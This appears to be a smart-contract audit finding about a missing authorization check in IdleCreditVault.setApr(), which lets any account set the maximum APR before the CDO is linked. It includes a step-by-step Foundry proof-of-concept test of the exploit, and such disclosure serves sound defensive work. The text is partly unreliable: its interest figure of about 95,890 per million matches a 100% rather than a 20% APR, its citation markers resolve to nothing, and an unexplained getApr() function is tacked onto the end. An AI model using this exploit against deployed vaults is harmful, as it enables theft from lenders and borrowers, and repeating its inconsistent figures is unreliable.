### Title
Unauthenticated APR takeover during credit-vault initialization lets an EOA inflate borrower interest - ([File: contracts/strategies/idle/IdleCreditVault.sol](contracts/strategies/idle/IdleCreditVault.sol#L225))

### Summary

`IdleCreditVault.setApr()` skips authorization whenever `idleCDO` is still unset, allowing any EOA in the post-initialization/pre-`setWhitelistedCDO` window to set the strategy APR to `DEFAULT_MAX_APR`. [1](#0-0) 

Because the attacker can subsequently pass KYC, deposit, and sequence around the honest owner’s `setWhitelistedCDO` and `startEpoch` calls, the vault treats the attacker-injected APR as contractual borrower interest. [2](#0-1) [3](#0-2) 

### Finding Description

`setApr()` is publicly callable, but its authorization check is skipped entirely when `idleCDO == address(0)`. [1](#0-0) 

This creates a state-transition authorization gap between strategy initialization and `setWhitelistedCDO()`: an arbitrary caller can set `lastApr` to the maximum `20e18` without being the CDO or manager. [4](#0-3) [1](#0-0) 

Once the honest owner links the CDO, the polluted `lastApr` remains active and `startEpoch()` calculates `expectedEpochInterest` from it. [5](#0-4) [6](#0-5) 

The borrower is then required to return both principal and that injected interest during `stopEpoch`; failure triggers the default path rather than correcting the unauthorized APR. [7](#0-6) [8](#0-7) 

### Impact Explanation

A KYC-passing attacker can deposit after `setWhitelistedCDO` and before the first epoch starts, then receive interest priced using the unauthorized maximum APR. [3](#0-2) [9](#0-8) 

At a `20e18` annualized scaled APR and the default `30 days + 5 days` accounting period, each `1,000,000` units of attacker-controlled principal creates approximately `95,890` units of unauthorized borrower interest. [10](#0-9) [11](#0-10) 

If the attacker is the dominant or sole LP, substantially all of that improperly accrued value is paid to the attacker; otherwise, the borrower’s excess payment is distributed across tranche holders according to the configured split. [12](#0-11) 

### Likelihood Explanation

The exploit requires a narrow deployment/configuration window: `initialize()` must have completed, `idleCDO` must still be zero, and the attacker must observe or front-run the owner’s subsequent `setWhitelistedCDO` call. [13](#0-12) [5](#0-4) 

No privileged role is needed for the APR write itself, and after the CDO is linked the attacker only needs the same KYC permission already available to ordinary lenders. [1](#0-0) [3](#0-2) 

Honest deployment tooling could mitigate the race by linking the CDO and initializing strategy parameters atomically, but the contract itself does not enforce that ordering. [5](#0-4) 

### Recommendation

Do not bypass authorization based on `idleCDO == address(0)`. Restrict `setApr`, `setAprs`, and `setAprsWithBuffer` to the configured CDO or manager, or add a dedicated owner-only setup function that is disabled permanently after `setWhitelistedCDO` is called. [14](#0-13) [1](#0-0) 

Alternatively, initialize `idleCDO` atomically in `initialize()` and validate it before accepting any public APR mutation. [13](#0-12) 

### Proof of Concept

The following Foundry sequence demonstrates the authorization window. It assumes a local fork or deployment harness that constructs the production `IdleCreditVault` behind a proxy and uses a KYC-approved attacker address.

```solidity
function test_UnauthenticatedAprInjection() public {
    // 1. Owner initializes the strategy, but has not yet linked idleCDO.
    vm.prank(owner);
    strategy.initialize(
        address(underlying),
        owner,
        manager,
        borrower,
        "Borrower",
        0
    );

    assertEq(strategy.idleCDO(), address(0));

    // 2. Arbitrary EOA injects the maximum APR while authorization is skipped.
    vm.prank(attacker);
    strategy.setApr(strategy.DEFAULT_MAX_APR());

    assertEq(strategy.lastApr(), 20e18);

    // 3. Honest owner later links the CDO. The injected APR remains active.
    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    // 4. KYC-passing attacker becomes the sole depositor.
    uint256 principal = 1_000_000e6;
    deal(address(underlying), attacker, principal);
    vm.startPrank(attacker);
    underlying.approve(address(cdo), principal);
    cdo.depositAA(principal);
    vm.stopPrank();

    // 5. Honest manager starts the epoch. CDO sends principal to borrower
    //    and records interest calculated from the attacker-set APR.
    vm.prank(manager);
    cdo.startEpoch();

    uint256 injectedInterest = cdo.expectedEpochInterest();
    assertGt(injectedInterest, 0);

    // 6. Borrower repays principal plus the injected interest.
    deal(address(underlying), borrower, principal + injectedInterest);
    vm.prank(borrower);
    underlying.approve(address(cdo), principal + injectedInterest);

    // 7. Close the pool after epochEndDate and recall all principal/interest.
    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 1);

    // 8. Attacker requests and claims the inflated withdrawal.
    uint256 before = underlying.balanceOf(attacker);
    vm.startPrank(attacker);
    cdo.requestWithdraw(0, cdo.AATranche());
    cdo.claimWithdrawRequest();
    vm.stopPrank();

    uint256 attackerProfit = underlying.balanceOf(attacker) - before - principal;
    assertGt(attackerProfit, 0);
}
```

The decisive behavior is that `expectedEpochInterest` is calculated from the attacker-controlled `lastApr`, and the borrower is charged that amount at epoch settlement. [6](#0-5) [15](#0-14)

  function getApr(address _tranche) external view returns (uint256) {
    uint256 _AATrancheSplitRatio = _getAARatio(false);
    uint256 stratApr = _getStrategyApr();
    if (_AATrancheSplitRatio == 0 || _AATrancheSplitRatio == FULL_ALLOC) {
      // with only one initialized tranche, it receives all apr and the empty tranche receives zero
      return (_tranche == AATranche) == (_AATrancheSplitRatio == 0) ? 0 : stratApr;
    }
    uint256 _trancheAPRSplitRatio = trancheAPRSplitRatio;
    if (_tranche != AATranche) {
      // BB apr is: stratApr * BBaprSplitRatio / BBSplitRatio -> where
      // BBaprSplitRatio is: (FULL_ALLOC - _trancheAPRSplitRatio) and
      // BBSplitRatio is: (FULL_ALLOC - _AATrancheSplitRatio)
      return stratApr * (FULL_ALLOC - _trancheAPRSplitRatio) / (FULL_ALLOC - _AATrancheSplitRatio);
    }
    // AA apr is: stratApr * AAaprSplitRatio / AASplitRatio
    return stratApr * _trancheAPRSplitRatio / _AATrancheSplitRatio;
  }
